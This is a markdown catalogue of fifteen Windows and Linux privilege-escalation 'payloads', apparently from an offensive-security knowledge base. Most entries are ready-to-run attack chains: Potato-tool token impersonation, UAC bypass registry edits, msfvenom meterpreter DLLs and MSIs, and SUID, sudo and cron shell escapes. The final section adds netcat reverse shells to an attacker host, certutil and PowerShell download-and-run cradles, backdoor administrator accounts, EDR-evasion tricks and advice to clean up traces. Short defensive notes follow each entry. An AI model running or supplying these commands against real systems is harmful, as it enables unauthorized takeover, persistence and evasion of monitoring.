# Privilege Escalation

_15 intranet payloads_

### Token Theft and Impersonation  `privilege-token`
_Steal and impersonate Windows access tokens_
Subcategory: **Token Manipulation** · tags: `token` `privilege` `impersonation` `windows`

**Prerequisites:**
- Access to the target machine already obtained
- SeImpersonatePrivilege privilege
- Windows system

**Attack chain:**

**List tokens**
> List all available tokens in the system
_platform: windows_
```
mimikatz.exe "privilege::debug" "token::list" "exit"
```

**Steal token**
> Steal the token of a specified user
_platform: windows_
```
mimikatz.exe "privilege::debug" "token::elevate /domainuser:Administrator" "exit"
```

**JuicyPotato attack**
> JuicyPotato privilege escalation (requires SeImpersonatePrivilege)
_platform: windows_
```
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
```
**Syntax breakdown:**
- `JuicyPotato.exe` — DCOM DCE/RPC local privilege escalation tool _command_
- `-l` — Listening port _parameter_
- `-p` — Program to execute _parameter_
- `-c` — CLSID _parameter_

**PrintSpoofer**
> PrintSpoofer privilege escalation
_platform: windows_
```
PrintSpoofer.exe -i -c cmd
```

**GodPotato**
> GodPotato privilege escalation, supports more Windows versions
_platform: windows_
```
GodPotato.exe -cmd "cmd /c whoami"
```

**EDR bypass variants:**

**RoguePotato**
> RoguePotato, bypasses more restrictions
```
RoguePotato.exe -r attacker_ip -l 9999 -e "cmd.exe"
```

**Analysis:** After successful token theft, you can impersonate a high-privilege user identity to perform operations.

**OPSEC tips:**
- The Potato series of tools exploit the DCOM mechanism
- Requires the SeImpersonatePrivilege privilege
- Different Windows versions require different CLSIDs

**Overview:** A Windows access token contains user identity and privilege information. An attacker can steal the token of a high-privilege user to escalate privileges.

**Vulnerability principle:** Windows allows a process to impersonate another user's token. If a service account has the SeImpersonatePrivilege privilege, an attacker can leverage this privilege to obtain SYSTEM privileges.

**Exploitation method:** Exploitation flow: 1) Obtain a service account with the SeImpersonatePrivilege privilege; 2) Use the Potato series of tools to trigger a SYSTEM process connection; 3) Steal the SYSTEM token; 4) Execute commands with SYSTEM privileges.

**Defensive measures:** Defensive measures: 1) Remove the SeImpersonatePrivilege privilege from unnecessary service accounts; 2) Monitor token operations; 3) Deploy EDR to detect abnormal behavior; 4) Apply system patches promptly.

---

### Windows Privilege Escalation  `windows-privesc`
_Windows system privilege escalation techniques_
Subcategory: **Windows** · tags: `privesc` `windows` `privilege`

**Prerequisites:**
- Normal user privileges
- System vulnerability

**Attack chain:**

**Check escalation vectors**
> Check current privileges
_platform: windows_
```
whoami /priv
whoami /groups
```

**Use WinPEAS**
> Automated privilege escalation checks
_platform: windows_
```
winpeas.exe
```

**Check service permissions**
> Check writable services
_platform: windows_
```
accesschk.exe -uwcqv "Everyone" *
```

**Check unquoted service paths**
> Find unquoted service paths
_platform: windows_
```
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"  | findstr /i /v """
```

**Overview:** Windows privilege escalation involves multiple vectors, including services, DLLs, the registry, and more.

**Vulnerability principle:** Misconfigurations, improper permissions, and kernel vulnerabilities.

**Exploitation method:** Exploitation flow: 1) Enumerate the system 2) Discover vulnerabilities 3) Exploit to escalate privileges

**Defensive measures:** Defensive measures: 1) Principle of least privilege 2) Apply patches promptly 3) Monitor privileged operations

---

### Linux Privilege Escalation  `linux-privesc`
_Linux system privilege escalation techniques_
Subcategory: **Linux** · tags: `privesc` `linux` `privilege`

**Prerequisites:**
- Normal user privileges
- System vulnerability

**Attack chain:**

**Check SUID**
> Find SUID files
_platform: linux_
```
find / -perm -4000 -type f 2>/dev/null
```
**Syntax breakdown:**
- `find /` — Start searching from the root directory _keyword_
- `-perm -4000` — SUID permission bit _parameter_
- `-type f` — Search only for files _parameter_

**Check Sudo**
> Check sudo privileges
_platform: linux_
```
sudo -l
```

**Check Cron**
> Check scheduled tasks
_platform: linux_
```
cat /etc/crontab
ls -la /etc/cron*
```

**Use LinPEAS**
> Automated privilege escalation checks
_platform: linux_
```
linpeas.sh
```

**Overview:** Linux privilege escalation involves SUID, Sudo, Cron, kernel vulnerabilities, and more.

**Vulnerability principle:** Misconfigurations, SUID abuse, and kernel vulnerabilities.

**Exploitation method:** Exploitation flow: 1) Enumerate the system 2) Discover vulnerabilities 3) Exploit to escalate privileges

**Defensive measures:** Defensive measures: 1) Principle of least privilege 2) Update the kernel 3) Monitor privileged operations

---

### UAC Bypass  `uac-bypass`
_Bypass Windows User Account Control_
Subcategory: **UAC** · tags: `uac` `bypass` `windows`

**Prerequisites:**
- Member of the Administrators group
- UAC enabled

**Attack chain:**

**Fodhelper**
> Bypass UAC via fodhelper
_platform: windows_
```
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "DelegateExecute" /d "" /f
fodhelper.exe
```

**Eventvwr**
> Bypass UAC via eventvwr
_platform: windows_
```
reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /d "cmd.exe" /f
eventvwr.exe
```

**Use UACME**
> Use the UACME tool
_platform: windows_
```
Akagi64.exe 23 cmd.exe
```

**Overview:** UAC can be bypassed through specific programs or registry operations.

**Vulnerability principle:** Certain system programs auto-elevate privileges.

**Exploitation method:** Exploitation flow: 1) Identify the bypass method 2) Modify the registry 3) Trigger execution

**Defensive measures:** Defensive measures: 1) Set UAC to the highest level 2) Monitor registry modifications

---

### DLL Hijacking  `dll-hijack`
_Escalate privileges via DLL hijacking_
Subcategory: **DLL** · tags: `dll` `hijack` `privesc`

**Prerequisites:**
- Writable directory
- DLL search order

**Attack chain:**

**Find DLL hijacks**
> Monitor DLLs loaded by processes
_platform: windows_
```
Use Procmon to monitor DLL loading
```

**Create malicious DLL**
> Generate a malicious DLL
_platform: linux_
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll > evil.dll
```

**Place the DLL**
> Place the DLL at the target location
_platform: windows_
```
copy evil.dll "C:\Program Files\VulnerableApp\missing.dll"
```

**Overview:** DLL hijacking leverages the DLL search order to load a malicious DLL.

**Vulnerability principle:** The DLL search order prioritizes the current directory.

**Exploitation method:** Exploitation flow: 1) Find a hijackable DLL 2) Create a malicious DLL 3) Trigger loading

**Defensive measures:** Defensive measures: 1) Use absolute paths 2) Safe DLL search mode

---

### Service Exploitation  `service-exploit`
_Escalate privileges via service vulnerabilities_
Subcategory: **Service** · tags: `service` `privesc` `windows`

**Prerequisites:**
- Service modification permissions
- Writable service path

**Attack chain:**

**Check service permissions**
> Check services the user can modify
_platform: windows_
```
accesschk.exe -uwcqv "Users" *
```

**Modify service path**
> Modify the service execution path
_platform: windows_
```
sc config VulnerableService binPath= "cmd /c whoami"
```

**Restart the service**
> Restart the service to execute the command
_platform: windows_
```
sc stop VulnerableService
sc start VulnerableService
```

**Overview:** Improper service configuration can lead to privilege escalation.

**Vulnerability principle:** Misconfigured service permissions, writable path.

**Exploitation method:** Exploitation flow: 1) Enumerate services 2) Check permissions 3) Modify execution

**Defensive measures:** Defensive measures: 1) Set service permissions correctly 2) Use quoted paths

---

### AlwaysInstallElevated Privilege Escalation  `always-install`
_Escalate privileges by exploiting AlwaysInstallElevated_
Subcategory: **MSI** · tags: `msi` `alwaysinstall` `privesc`

**Prerequisites:**
- AlwaysInstallElevated enabled

**Attack chain:**

**Check the setting**
> Check whether it is enabled
_platform: windows_
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Create MSI**
> Generate a malicious MSI
_platform: linux_
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f msi > evil.msi
```

**Install MSI**
> Install the MSI to execute code
_platform: windows_
```
msiexec /quiet /qn /i evil.msi
```

**Overview:** AlwaysInstallElevated allows users to install MSIs with SYSTEM privileges.

**Vulnerability principle:** The registry configuration allows any user to install with high privileges.

**Exploitation method:** Exploitation flow: 1) Check the setting 2) Create an MSI 3) Install to execute

**Defensive measures:** Defensive measures: 1) Disable AlwaysInstallElevated 2) Monitor MSI installations

---

### Juicy Potato Privilege Escalation  `juicy-potato`
_Escalate privileges by exploiting COM objects and SeImpersonatePrivilege_
Subcategory: **Potato** · tags: `juicy-potato` `com` `privesc`

**Prerequisites:**
- SeImpersonatePrivilege
- Windows < 2019

**Attack chain:**

**Check privileges**
> Check for SeImpersonatePrivilege
_platform: windows_
```
whoami /priv | findstr SeImpersonate
```

**Execute JuicyPotato**
> Escalate privileges using JuicyPotato
_platform: windows_
```
JuicyPotato.exe -t * -p cmd.exe -l 1337
```
**Syntax breakdown:**
- `-t *` — Process creation type _parameter_
- `-p cmd.exe` — Program to execute _parameter_
- `-l 1337` — Listening port _parameter_

**Overview:** Juicy Potato exploits COM objects and SeImpersonatePrivilege to escalate privileges.

**Vulnerability principle:** COM objects can be abused to obtain SYSTEM privileges.

**Exploitation method:** Exploitation flow: 1) Check privileges 2) Select a CLSID 3) Execute to escalate

**Defensive measures:** Defensive measures: 1) Remove SeImpersonatePrivilege 2) Upgrade Windows

---

### PrintSpoofer Privilege Escalation  `printspoofer`
_Escalate privileges by exploiting the printer service_
Subcategory: **PrintSpoofer** · tags: `printspoofer` `privesc` `windows`

**Prerequisites:**
- SeImpersonatePrivilege

**Attack chain:**

**Execute PrintSpoofer**
> Escalate privileges using PrintSpoofer
_platform: windows_
```
PrintSpoofer.exe -i -c cmd
```

**Specify a command**
> Execute a specified command
_platform: windows_
```
PrintSpoofer.exe -c "whoami > C:\out.txt"
```

**Overview:** PrintSpoofer exploits the printer service to obtain SYSTEM privileges.

**Vulnerability principle:** The printer service allows privileged impersonation.

**Exploitation method:** Exploitation flow: 1) Check privileges 2) Execute PrintSpoofer

**Defensive measures:** Defensive measures: 1) Remove SeImpersonatePrivilege 2) Disable the print service

---

### GodPotato Privilege Escalation  `godpotato`
_GodPotato privilege escalation tool_
Subcategory: **GodPotato** · tags: `godpotato` `privesc` `windows`

**Prerequisites:**
- SeImpersonatePrivilege

**Attack chain:**

**Execute GodPotato**
> Escalate privileges using GodPotato
_platform: windows_
```
GodPotato.exe -cmd "cmd /c whoami"
```

**Reverse shell**
> Execute a reverse shell
_platform: windows_
```
GodPotato.exe -cmd "cmd /c powershell -e BASE64_CMD"
```

**Overview:** GodPotato is an improved version of JuicyPotato, supporting more Windows versions.

**Vulnerability principle:** COM object and privileged impersonation vulnerabilities.

**Exploitation method:** Exploitation flow: 1) Check privileges 2) Execute GodPotato

**Defensive measures:** Defensive measures: 1) Remove SeImpersonatePrivilege 2) Update the system

---

### SUID Exploitation  `suid-exploit`
_Escalate privileges by exploiting SUID files_
Subcategory: **SUID** · tags: `suid` `privesc` `linux`

**Prerequisites:**
- SUID files exist
- Exploitable program

**Attack chain:**

**Find SUID**
> Find all SUID files
_platform: linux_
```
find / -perm -4000 -type f 2>/dev/null
```

**Common exploitable programs**
> Common SUID exploitation methods
_platform: linux_
```
nmap --interactive
vim -c ':!/bin/sh'
find / -exec /bin/sh \;
cp /bin/sh /tmp/sh; chmod +s /tmp/sh
```

**GTFOBins**
> Find program exploitation methods
_platform: linux_
```
Refer to the GTFOBins website to find exploitable programs
```

**Overview:** SUID files execute with the file owner's privileges and may be exploited to escalate privileges.

**Vulnerability principle:** SUID programs have vulnerabilities or can be abused.

**Exploitation method:** Exploitation flow: 1) Find SUID files 2) Analyze exploitability 3) Execute to escalate

**Defensive measures:** Defensive measures: 1) Audit SUID files 2) Remove unnecessary SUID bits

---

### Sudo Exploitation  `sudo-exploit`
_Escalate privileges by exploiting Sudo configuration_
Subcategory: **Sudo** · tags: `sudo` `privesc` `linux`

**Prerequisites:**
- Improperly configured Sudo privileges

**Attack chain:**

**Check Sudo privileges**
> List executable sudo commands
_platform: linux_
```
sudo -l
```

**Common exploitation**
> Common sudo exploitation methods
_platform: linux_
```
sudo vim -c ':!/bin/sh'
sudo find / -exec /bin/sh \;
sudo awk 'BEGIN {system("/bin/sh")}'
```

**CVE-2021-3156**
> Baron Samedit vulnerability
_platform: linux_
```
Exploit the sudo heap overflow vulnerability
```

**Overview:** Improper Sudo configuration allows users to execute specific commands as root.

**Vulnerability principle:** Sudo rules allow execution of programs that can escape to a shell.

**Exploitation method:** Exploitation flow: 1) Check sudo privileges 2) Find an exploitable program 3) Execute to escalate

**Defensive measures:** Defensive measures: 1) Restrict sudo rules 2) Use the NOEXEC tag

---

### Cron Exploitation  `cron-exploit`
_Escalate privileges by exploiting Cron jobs_
Subcategory: **Cron** · tags: `cron` `privesc` `linux`

**Prerequisites:**
- Writable Cron script
- Wildcard injection

**Attack chain:**

**Check Cron jobs**
> View scheduled tasks
_platform: linux_
```
cat /etc/crontab
ls -la /etc/cron*
```

**Check script permissions**
> Check Cron script permissions
_platform: linux_
```
ls -la /path/to/cron/script.sh
```

**Wildcard injection**
> Exploit tar wildcard injection
_platform: linux_
```
Create in the Cron directory: --checkpoint=1
--checkpoint-action=exec=sh shell.sh
```

**Overview:** Cron jobs execute as a specific user and can be exploited to escalate privileges.

**Vulnerability principle:** Writable scripts, wildcard injection, PATH hijacking.

**Exploitation method:** Exploitation flow: 1) Check Cron jobs 2) Discover vulnerabilities 3) Exploit to escalate

**Defensive measures:** Defensive measures: 1) Use absolute paths 2) Restrict script permissions 3) Avoid wildcards

---

### Kernel Exploit Privilege Escalation  `kernel-exploit`
_Escalate privileges by exploiting kernel vulnerabilities_
Subcategory: **Kernel** · tags: `kernel` `privesc` `exploit`

**Prerequisites:**
- Kernel vulnerability exists
- Able to compile/execute the exploit

**Attack chain:**

**Check kernel version**
> View kernel version information
_platform: linux_
```
uname -a
cat /proc/version
```

**Search for exploits**
> Search for kernel exploits
_platform: linux_
```
searchsploit kernel VERSION
```

**Common kernel vulnerabilities**
> Common kernel privilege escalation vulnerabilities
_platform: linux_
```
DirtyCow (CVE-2016-5195)
DirtyPipe (CVE-2022-0847)
PwnKit (CVE-2021-4034)
```

**Overview:** Kernel vulnerabilities can directly obtain root privileges.

**Vulnerability principle:** The kernel code contains vulnerabilities that can be exploited.

**Exploitation method:** Exploitation flow: 1) Identify the kernel version 2) Find the corresponding exploit 3) Compile and execute

**Defensive measures:** Defensive measures: 1) Update the kernel promptly 2) Use SELinux 3) Restrict the compilation environment

---

### Potato Series Privilege Escalation Attacks  `potato-attack`
_Leverage Windows token impersonation and NTLM relay mechanisms to escalate from a service account (SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege) to SYSTEM_
Subcategory: **Potato Privilege Escalation** · tags: `privilege-escalation` `potato` `token-impersonation` `ntlm-relay` `windows`

**Prerequisites:**
- Holds the SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege privilege
- Commonly found in IIS AppPool, SQL Server, and various service accounts

**Attack chain:**

**Check current privileges**
> First confirm whether the current user holds token impersonation privileges. IIS application pool accounts, SQL Server service accounts, and Windows service accounts usually hold this privilege by default
_platform: windows_
```
# Check whether Impersonate privilege is held
whoami /priv

# Focus on the following privileges:
# SeImpersonatePrivilege - Impersonate a client's token
# SeAssignPrimaryTokenPrivilege - Replace a process-level token

# Confirm the current user identity
whoami /all
echo %USERNAME%
```
**Syntax breakdown:**
- `whoami /priv` — List all privileges of the current user _command_
- `SeImpersonatePrivilege` — The key privilege that allows impersonating another user's token _value_
- `SeAssignPrimaryTokenPrivilege` — The privilege that allows assigning a token to a new process _value_

**JuicyPotato (Windows Server 2016/2019)**
> JuicyPotato uses a COM server and NTLM authentication to achieve token impersonation. By creating a local COM server, it tricks the SYSTEM account into authenticating to it, then impersonates that token to execute commands
_platform: windows_
```
# Download JuicyPotato
certutil -urlcache -split -f http://attacker/JuicyPotato.exe C:\temp\jp.exe

# Use JuicyPotato to escalate privileges and execute a command
C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\temp\proof.txt" -t *

# Use a specific CLSID (different systems require different CLSIDs)
C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user testadmin Test@123 /add && net localgroup administrators testadmin /add" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

# Reverse shell
C:\temp\jp.exe -l 1337 -p C:\temp\nc.exe -a "-e cmd.exe attacker_ip 4444" -t *
```
**Syntax breakdown:**
- `-l 1337` — COM server listening port _parameter_
- `-p` — Program to execute with SYSTEM privileges _parameter_
- `-a` — Arguments passed to the program _parameter_
- `-t *` — Try both CreateProcessWithToken and CreateProcessAsUser _parameter_
- `-c {CLSID}` — Specify the COM object CLSID (must match the target system version) _parameter_

**PrintSpoofer (Windows 10/Server 2019+)**
> PrintSpoofer leverages the named pipe impersonation feature of the Windows print service. It creates a named pipe and tricks the Print Spooler service into connecting to it, thereby obtaining a SYSTEM token. Suitable for newer Windows versions where JuicyPotato cannot be used
_platform: windows_
```
# PrintSpoofer - Leverage the print service named pipe
PrintSpoofer.exe -i -c cmd

# Execute a command directly
PrintSpoofer.exe -c "cmd /c whoami > C:\temp\proof.txt"

# Reverse shell
PrintSpoofer.exe -c "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe"

# Launch PowerShell as SYSTEM
PrintSpoofer.exe -i -c powershell.exe
```
**Syntax breakdown:**
- `-i` — Interactive mode (get an interactive shell) _parameter_
- `-c cmd` — Command to execute with SYSTEM privileges _parameter_

**Sweet Potato (multi-technique integration)**
> SweetPotato integrates multiple techniques such as PrintSpoofer and EfsPotato, automatically selecting the attack method suitable for the target system
_platform: windows_
```
# SweetPotato - Integrates multiple Potato techniques
SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"

# Specify the attack method
SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c net user testadmin Test@123 /add"
```
**Syntax breakdown:**
- `-e EfsRpc` — Specify using the EFS RPC attack vector _parameter_
- `-p` — Path of the program to execute _parameter_

**GodPotato (works on all versions)**
> GodPotato exploits a vulnerability in the DCOM OXID resolver, requires no CLSID, and is compatible with almost all Windows versions. It is currently the most universal Potato variant
_platform: windows_
```
# GodPotato - Works on all Windows Server 2012-2022 versions
GodPotato.exe -cmd "cmd /c whoami"

# Execute a reverse shell
GodPotato.exe -cmd "cmd /c C:\temp\nc.exe -e cmd.exe attacker_ip 4444"

# Add an administrator
GodPotato.exe -cmd "net user testadmin Test@123 /add && net localgroup administrators testadmin /add"

# Execute PowerShell
GodPotato.exe -cmd "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
```
**Syntax breakdown:**
- `-cmd` — Command to execute with SYSTEM privileges _parameter_
- `GodPotato.exe` — An all-version-compatible Potato privilege escalation tool _command_

**RoguePotato (remote scenario)**
> RoguePotato is an improved version of JuicyPotato that achieves NTLM authentication relay through a remote OXID resolver. It requires an attacker machine to assist in completing the relay
_platform: windows_
```
# Attacker machine - Start socat redirection
socat tcp-listen:135,reuseaddr,fork tcp:target_ip:9999

# Target machine - Execute RoguePotato
RoguePotato.exe -r attacker_ip -e "cmd /c whoami > C:\temp\proof.txt" -l 9999

# Or use netcat for a reverse shell
RoguePotato.exe -r attacker_ip -e "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe" -l 9999
```
**Syntax breakdown:**
- `-r attacker_ip` — Attacker machine IP (running the OXID resolver) _parameter_
- `-l 9999` — Local listening port _parameter_
- `-e` — Command to execute _parameter_

**Potato selection decision flow**
> Select the appropriate Potato variant tool based on the target system version
_platform: windows_
```
# === Decision Flow ===
# 1. whoami /priv to confirm SeImpersonatePrivilege
# 2. systeminfo to confirm the system version
#
# Windows Server 2012-2016 => JuicyPotato
# Windows Server 2019 (before 1809) => JuicyPotato (requires correct CLSID)
# Windows 10/Server 2019+ => PrintSpoofer or GodPotato
# Windows Server 2022 => GodPotato
# All versions => SweetPotato (auto-select)
# Remote relay needed => RoguePotato
#
# Common CLSID lookup: https://ohpe.it/juicy-potato/CLSID/
```

**EDR bypass variants:**

**Potato techniques to bypass EDR detection**
> Bypass EDR detection of Potato tools through reflective loading, renaming, using newer tools, and similar methods
_platform: windows_
```
# 1. Rename the binary
ren GodPotato.exe svcutil.exe

# 2. Use .NET reflective loading (no file on disk)
powershell -ep bypass -c "$bytes=[System.IO.File]::ReadAllBytes('C:\temp\gp.exe');[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,@(,@('-cmd','cmd /c whoami')))";

# 3. Use SharpToken as an alternative (newer tool, fewer signatures)
SharpToken.exe execute SYSTEM "cmd /c whoami"
```

**Analysis:** The Potato series of attacks leverage the Windows token impersonation mechanism — a service account holding SeImpersonatePrivilege can impersonate any user token that authenticates to it. The attacker tricks the SYSTEM account into authenticating to a local COM server/named pipe, and after obtaining the SYSTEM token, creates a high-privilege process. This is one of the most common privilege escalation methods for web servers (IIS) and databases (SQL Server).

**OPSEC tips:**
- 1) The binary files of Potato tools have obvious signatures; in-memory loading is recommended 2) The names of created named pipes may be monitored 3) Clean up tools and temporary files immediately after success 4) Avoid sensitive commands such as net user; use stealthier post-exploitation methods instead

**Overview:** The Potato series is a classic attack technique for escalating from a service account to SYSTEM in a Windows environment, achieved through token impersonation and NTLM relay.

**Vulnerability principle:** Windows service accounts (IIS/SQL Server, etc.) hold the SeImpersonatePrivilege privilege by default. An attacker can leverage this privilege to trick the SYSTEM account into authenticating via DCOM/named pipes and impersonate its token to escalate privileges.

**Exploitation method:** Exploitation flow: 1) whoami /priv to confirm the Impersonate privilege 2) Select the appropriate Potato tool based on the system version 3) Execute the Potato tool to obtain SYSTEM privileges 4) Perform post-exploitation operations

**Defensive measures:** Defensive measures: 1) Principle of least privilege, remove unnecessary SeImpersonatePrivilege 2) Use gMSA accounts to run services 3) Monitor abnormal token operations and named pipe creation 4) Apply Windows patches promptly

**References:**
- <https://attack.mitre.org/techniques/T1134/001/>
- <https://github.com/BeichenDream/GodPotato>

---
